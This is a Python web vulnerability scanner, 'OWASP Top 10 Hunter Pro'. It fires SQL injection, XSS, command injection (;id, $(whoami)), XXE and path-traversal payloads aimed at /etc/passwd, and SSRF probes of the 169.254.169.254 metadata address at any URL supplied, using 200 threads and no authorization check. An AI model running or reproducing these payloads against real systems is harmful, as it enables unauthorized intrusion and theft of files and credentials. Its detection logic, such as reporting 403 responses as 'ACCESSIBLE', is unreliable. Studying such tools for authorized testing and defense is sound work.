import requests
import urllib.parse
import threading
import time
import re
import json
import socket
import ssl
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
from pathlib import Path
import hashlib
import argparse
from datetime import datetime
import secrets
from urllib.parse import quote
import subprocess

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class OWASP10HunterPro:
    def __init__(self, target, threads=200, timeout=10, output_dir="owasp_reports"):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "OWASP-Top10-Hunter-Pro/5.0"
        })
        
       
        self.payloads = {
            'A03_INJECTION': {
                'sqli': ["' OR 1=1--", "' AND SLEEP(5)--", "' UNION SELECT 1,2,3--"],
                'xss': ["<script>alert(1)</script>", "';alert(1);//", "<img src=x onerror=alert(1)>"],
                'cmd': [";id", "|whoami", "`whoami`", "$(whoami)"]
            },
            'A01_BROKEN_AC': ["/admin", "/.env", "/config", "/api/admin"],
            'A10_SSRF': ["http://127.0.0.1", "http://169.254.169.254", "http://burp"],
            'A04_XXE': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'],
            'A05_LFI': ["../../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
            'A07_IDOR': ["id=1", "user_id=1", "account=1"]
        }
        
        self.results = {}
        self.critical_findings = []
        self.oob_hits = []
        
    def banner(self, title):
        print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}")
        print(f"{Fore.RED + Style.BRIGHT}{title.center(100)}")
        print(f"{Fore.CYAN + Style.BRIGHT}{'='*100}{Style.RESET_ALL}")
    
    def get_baseline(self):
        """Базовый запрос для сравнения"""
        resp = self.session.get(self.target, timeout=self.timeout)
        return {
            'status': resp.status_code,
            'length': len(resp.text),
            'hash': hashlib.sha256(resp.text.encode(errors='ignore')).hexdigest(),
            'headers': dict(resp.headers),
            'text': resp.text
        }
    
    def a01_broken_access_control(self):
        """A01: Broken Access Control - Полный скан"""
        self.banner("A01: BROKEN ACCESS CONTROL")
        findings = []
        
        
        paths = [
            "/admin", "/administrator", "/dashboard", "/wp-admin", "/manager",
            "/api/admin", "/.env", "/config", "/backup", "/debug",
            "admin.php", "login.php", "user.php"
        ]
        
        def test_path(path):
            url = urllib.parse.urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code in [200, 302, 401, 403]:
                    return f"🔴 {path} ({resp.status_code}) - ACCESSIBLE!"
            except Exception:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads//10) as executor:
            results = list(executor.map(test_path, paths))
        
        findings = [r for r in results if r]
        if findings:
            self.critical_findings.extend(findings)
            for f in findings:
                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
            return "CRITICAL", findings
        
        print(f"{Fore.GREEN}[✓] No exposed admin paths{Style.RESET_ALL}")
        return "CLEAN", []
    
    def a02_crypto_failures(self):
        """A02: Cryptographic Failures"""
        self.banner("A02: CRYPTOGRAPHIC FAILURES")
        findings = []
        
        parsed = urllib.parse.urlparse(self.target)
        if parsed.scheme != "https":
            findings.append("🔴 HTTP (not HTTPS)")
        
      
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((parsed.hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=parsed.hostname) as ssock:
                    proto = ssock.version()
                    if proto in ["TLSv1", "TLSv1.1"]:
                        findings.append(f"🔴 Weak TLS: {proto}")
        except Exception:
            findings.append("❓ TLS check failed")
        
        if findings:
            for f in findings:
                print(f"{Fore.RED}{f}{Style.RESET_ALL}")
            return "HIGH", findings
        
        print(f"{Fore.GREEN}[✓] Strong crypto detected{Style.RESET_ALL}")
        return "CLEAN", []
    
    def a03_injection_fullscan(self, baseline):
        """A03: INJECTION - Полный арсенал"""
        self.banner("A03: INJECTION VULNERABILITIES")
        findings = []
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        
        def test_injection(param):
            tests = []
            tests.extend(self.payloads['A03_INJECTION']['sqli'])
            tests.extend(self.payloads['A03_INJECTION']['xss'])
            tests.extend(self.payloads['A03_INJECTION']['cmd'])
            
            for payload in tests:
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
                
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    
                    
                    if (resp.status_code != baseline['status'] or 
                        abs(len(resp.text) - baseline['length']) > 100 or
                        payload in resp.text):
                        
                        vuln_type = "SQLi" if any(sqli in payload for sqli in ['OR 1=1', 'UNION', 'SLEEP']) else \
                                   "XSS" if any(xss in payload for xss in ['alert', '<script', '<img']) else \
                                   "CMD"
                        
                        findings.append({
                            'param': param,
                            'payload': payload,
                            'type': vuln_type,
                            'url': test_url,
                            'diff': abs(len(resp.text) - baseline['length'])
                        })
                        break
                except Exception:
                    continue
        
        with ThreadPoolExecutor(max_workers=self.threads//5) as executor:
            executor.map(test_injection, params.keys())
        
        if findings:
            self.critical_findings.extend([f"💉 {f['type']} in {f['param']}: {f['payload']}" for f in findings])
            for f in findings:
                color = Fore.RED if f['type'] == 'SQLi' else Fore.MAGENTA
                print(f"{color}💉 {f['type']} [{f['param']}] {f['payload'][:40]}{Style.RESET_ALL}")
            return "CRITICAL", findings
        
        print(f"{Fore.GREEN}[✓] No injection detected{Style.RESET_ALL}")
        return "CLEAN", []
    
    def a04_xxe_lfi(self):
        """A04: XXE + A05: LFI"""
        self.banner("A04: XXE / A05: LFI/RFI")
        findings = []
        
       
        files = ['/etc/passwd', '/proc/version', 'C:\\Windows\\win.ini', '\\windows\\system32\\drivers\\etc\\hosts']
        
        for file in files:
            payload = quote(f"<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///{file}'>]><x>&xxe;</x>")
            resp = self.session.post(self.target, data={'xml': payload}, timeout=self.timeout)
            if any(line in resp.text for line in ['root:', 'Microsoft', 'Copyright']):
                findings.append(f"🔴 XXE/LFI: {file}")
        
        
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        for param in params:
            for lfi in self.payloads['A05_LFI']:
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = lfi
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
                resp = self.session.get(test_url, timeout=self.timeout)
                if 'root:' in resp.text or 'daemon' in resp.text:
                    findings.append(f"🔴 LFI [{param}]: {lfi}")
        
        if findings:
            self.critical_findings.extend(findings)
            for f in findings:
                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
            return "CRITICAL", findings
        
        print(f"{Fore.GREEN}[✓] No XXE/LFI detected{Style.RESET_ALL}")
        return "CLEAN", []
    
    def a10_ssrf_pro(self):
        """A10: SSRF Pro тест"""
        self.banner("A10: SSRF")
        findings = []
        
        ssrf_payloads = self.payloads['A10_SSRF']
        
        for payload in ssrf_payloads:
            parsed = urllib.parse.urlparse(self.target)
            params = urllib.parse.parse_qs(parsed.query)
            if params:
                param = list(params.keys())[0]
                params[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
            else:
                test_url = f"{self.target}?url={urllib.parse.quote(payload)}"
            
            resp = self.session.get(test_url, timeout=self.timeout)
            if resp.status_code != 404 and len(resp.text) > 100:
                findings.append(f"🔴 SSRF possible: {payload}")
        
        if findings:
            self.critical_findings.extend(findings)
            for f in findings:
                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
            return "HIGH", findings
        
        print(f"{Fore.GREEN}[✓] No SSRF vectors found{Style.RESET_ALL}")
        return "CLEAN", []
    
    def security_headers_audit(self, baseline):
        """A05: Security Headers"""
        self.banner("A05: SECURITY MISCONFIG")
        findings = []
        
        required_headers = {
            "Content-Security-Policy": "MISSING CSP",
            "X-Frame-Options": "Clickjacking possible", 
            "X-Content-Type-Options": "MIME sniffing",
            "Strict-Transport-Security": "No HSTS",
            "Referrer-Policy": "Referrer leakage"
        }
        
        for header, impact in required_headers.items():
            if header.lower() not in {k.lower(): v for k, v in baseline['headers'].items()}:
                findings.append(f"⚠️ {header} - {impact}")
        
        if findings:
            for f in findings:
                print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
            return "MEDIUM", findings
        
        print(f"{Fore.GREEN}[✓] All security headers present{Style.RESET_ALL}")
        return "CLEAN", []
    
    def run_full_hunt(self):
        """Полная охота OWASP Top 10"""
        self.banner("🚀 OWASP TOP 10 HUNTER PRO v5.0 - FULL SPECTRUM SCAN 🚀")
        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.target}{Style.RESET_ALL}")
        
        baseline = self.get_baseline()
        
        
        self.results["A01"] = self.a01_broken_access_control()
        self.results["A02"] = self.a02_crypto_failures()
        self.results["A03"] = self.a03_injection_fullscan(baseline)
        self.results["A04"] = self.a04_xxe_lfi()
        self.results["A05"] = self.security_headers_audit(baseline)
        self.results["A10"] = self.a10_ssrf_pro()
        
        self.generate_pro_report()
    
    def generate_pro_report(self):
        """Профессиональный отчет"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        report = {
            'scan_time': datetime.now().isoformat(),
            'target': self.target,
            'risk_score': len(self.critical_findings) * 10,
            'critical_findings': self.critical_findings,
            'full_results': self.results
        }
        
        
        json_file = self.output_dir / f"owasp_hunt_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        
        self.banner("📊 EXECUTIVE SUMMARY")
        critical_count = len(self.critical_findings)
        risk_color = Fore.RED + Style.BRIGHT if critical_count > 0 else Fore.GREEN + Style.BRIGHT
        
        print(f"{risk_color}🎯 CRITICAL FINDINGS: {critical_count}{Style.RESET_ALL}")
        for finding in self.critical_findings[:10]:  
            print(f"  {Fore.RED}• {finding}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}📋 Полный отчет: {json_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  MANUAL VERIFICATION REQUIRED{Style.RESET_ALL}")


def run():
    '''Wrapper function for main.py integration'''
    print(f"\n{Fore.CYAN}{'='*100}")
    print(f"{Fore.RED + Style.BRIGHT}🚀 OWASP TOP 10 HUNTER PRO v5.0{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*100}{Style.RESET_ALL}\n")
    
    try:
        target = input(f"{Fore.YELLOW}🎯 Enter target URL: {Style.RESET_ALL}").strip()
        
        if not target:
            print(f"{Fore.RED}[!] Empty target. Aborting.{Style.RESET_ALL}")
            input(f"{Fore.BLUE}Press Enter to return...{Style.RESET_ALL}")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        threads = input(f"{Fore.YELLOW}Threads (default 200): {Style.RESET_ALL}").strip()
        threads = int(threads) if threads.isdigit() else 200
        
        timeout = input(f"{Fore.YELLOW}Timeout in seconds (default 10): {Style.RESET_ALL}").strip()
        timeout = int(timeout) if timeout.isdigit() else 10
        
        output_dir = input(f"{Fore.YELLOW}Output directory (default owasp_reports): {Style.RESET_ALL}").strip()
        output_dir = output_dir if output_dir else "owasp_reports"
        
        hunter = OWASP10HunterPro(target, threads, timeout, output_dir)
        hunter.run_full_hunt()
        
        print(f"\n{Fore.CYAN}{'='*100}")
        input(f"{Fore.GREEN}✅ Scan complete! Press Enter to return to menu...{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Scan interrupted{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description='🚀 OWASP Top 10 Hunter Pro v5.0')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=200, help='Threads')
    parser.add_argument('-T', '--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('-o', '--output', default='owasp_reports', help='Output dir')
    
    args = parser.parse_args()
    
    hunter = OWASP10HunterPro(args.target, args.threads, args.timeout, args.output)
    hunter.run_full_hunt()
    
    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}")
    input("🔥 Scan complete. Press Enter to exit...")

if __name__ == "__main__":
    main()